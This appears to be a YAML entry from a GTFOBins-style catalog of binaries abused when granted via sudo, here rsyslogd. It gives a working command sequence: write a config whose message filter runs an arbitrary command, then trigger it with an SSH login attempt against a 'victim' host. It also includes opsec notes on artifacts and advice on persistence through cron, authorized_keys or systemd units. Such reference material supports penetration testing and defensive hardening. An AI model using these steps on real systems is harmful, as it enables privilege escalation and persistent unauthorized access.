---
name: rsyslogd
capabilities:
- exec
required_permissions:
  level: sudo
  notes: Requires sudo rule for this binary.
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: command
  description: Execute an arbitrary command.
  capabilities:
  - exec
  command: |-
    cat >/path/to/temp-file <<EOF
    module(load="imuxsock")
    :msg, contains, "somerandomstring" ^/path/to/command
    EOF

    rsyslogd -f /path/to/temp-file
  notes: |-
    In order for this to work, one must be able to trigger one event containing the chosen string, e.g., `somerandomstring`. One possibility is to attempt to connect to the victim host via SSH, for example:

    ```
    ssh somerandomstring@victim.com
    ```
references:
- https://gtfobins.github.io/gtfobins/rsyslogd/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
